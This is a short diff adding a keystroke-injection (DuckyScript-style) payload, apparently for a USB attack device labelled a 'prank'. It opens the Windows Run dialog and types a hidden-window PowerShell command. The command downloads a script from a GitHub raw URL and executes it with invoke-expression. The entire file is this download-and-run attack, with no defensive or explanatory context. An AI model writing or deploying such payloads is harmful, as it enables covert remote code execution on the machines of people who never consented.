@@ -1,0 +1,4 @@
+WINDOWS
+DELAY 200
+STRING powershell -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Baby.ps1; invoke-expression $pl
+ENTER
